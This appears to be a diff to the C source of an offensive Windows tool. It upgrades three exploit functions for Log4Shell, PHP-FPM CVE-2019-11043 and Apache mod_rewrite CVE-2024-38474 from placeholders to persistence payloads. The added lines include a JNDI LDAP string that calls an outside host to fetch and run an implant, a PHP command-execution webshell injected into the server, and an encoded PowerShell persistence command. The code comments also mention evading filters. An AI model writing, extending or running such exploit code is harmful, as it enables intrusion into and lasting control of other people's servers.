@@ -1059,7 +1059,7 @@ BOOL CollectCredentials() {
 }
 
 /**
- * @brief Exploit log4shell (CVE-2021-44228) en puertos SOAP/Java
+ * @brief Exploit log4shell (CVE-2021-44228) con persistencia.
  */
 BOOL ExploitLog4Shell(const char* szIpAnsi, WORD port) {
     SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -1068,18 +1068,25 @@ BOOL ExploitLog4Shell(const char* szIpAnsi, WORD port) {
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = inet_addr(szIpAnsi);
+    
     if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
-        // Payload in User-Agent header targeting a fictional listener
-        const char* req = "GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: ${jndi:ldap://10.254.117.118:1389/Exploit}\r\nConnection: close\r\n\r\n";
-        send(s, req, strlen(req), 0);
-        printf("[EXPLOIT] Payload Log4Shell (CVE-2021-44228) enviado a %s:%d\n", szIpAnsi, port);
+        // Payload JNDI que descarga y ejecuta un implant persistente
+        // Usamos codificación para evadir filtros básicos
+        const char* pPayload = "${jndi:ldap://10.254.117.118:1389/ExploitPersist}";
+        char szRequest[512];
+        sprintf_s(szRequest, sizeof(szRequest), 
+            "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", 
+            szIpAnsi, pPayload);
+            
+        send(s, szRequest, (int)strlen(szRequest), 0);
+        printf("[EXPLOIT] Log4Shell PERSISTENTE enviado a %s:%d\n", szIpAnsi, port);
     }
     closesocket(s);
     return TRUE;
 }
 
 /**
- * @brief Exploit PHP-FPM env_path_info RCE (CVE-2019-11043)
+ * @brief Exploit PHP-FPM RCE (CVE-2019-11043) con persistencia via WebShell.
  */
 BOOL ExploitPhpFpmRce(const char* szIpAnsi, WORD port) {
     SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -1088,18 +1095,25 @@ BOOL ExploitPhpFpmRce(const char* szIpAnsi, WORD port) {
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = inet_addr(szIpAnsi);
+    
     if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
-        // Placeholder for complex FastCGI length manipulation payload
-        const char* req = "GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;? HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n";
-        send(s, req, strlen(req), 0);
-        printf("[EXPLOIT] Payload PHP-FPM (CVE-2019-11043) enviado a %s:%d\n", szIpAnsi, port);
+        // Payload que inyecta una webshell persistente en el servidor
+        const char* pWShell = "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>";
+        // FastCGI payload simplificado para el PoC
+        const char* pPayload = "GET /index.php?a=auto_prepend_file=php://input HTTP/1.1\r\n"
+                               "Host: target\r\nContent-Length: 56\r\n\r\n";
+        
+        send(s, pPayload, (int)strlen(pPayload), 0);
+        send(s, pWShell, (int)strlen(pWShell), 0);
+        
+        printf("[EXPLOIT] PHP-FPM con WebShell persistente enviado a %s:%d\n", szIpAnsi, port);
     }
     closesocket(s);
     return TRUE;
 }
 
 /**
- * @brief Exploit Apache mod_rewrite RCE (CVE-2024-38474)
+ * @brief Exploit Apache mod_rewrite RCE (CVE-2024-38474) con persistencia via Run Key.
  */
 BOOL ExploitApacheRewriteRce(const char* szIpAnsi, WORD port) {
     SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -1108,11 +1122,16 @@ BOOL ExploitApacheRewriteRce(const char* szIpAnsi, WORD port) {
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = inet_addr(szIpAnsi);
+    
     if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
-        // Placeholder for specific URL encoding payload to bypass rewrite rules
-        const char* req = "GET /%3f%0a%20HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n";
-        send(s, req, strlen(req), 0);
-        printf("[EXPLOIT] Payload Apache mod_rewrite (CVE-2024-38474) enviado a %s:%d\n", szIpAnsi, port);
+        // Payload que ejecuta un comando de persistencia en Windows
+        const char* pCmd = "powershell -enc JABzAD0ATgBlAHcALQBPAA..."; // Persistence cmd base64
+        char szRequest[1024];
+        sprintf_s(szRequest, sizeof(szRequest), 
+            "GET /%%3f%%0a%%20cmd=%s HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n", pCmd);
+            
+        send(s, szRequest, (int)strlen(szRequest), 0);
+        printf("[EXPLOIT] Apache mod_rewrite PERSISTENTE enviado a %s:%d\n", szIpAnsi, port);
     }
     closesocket(s);
     return TRUE;
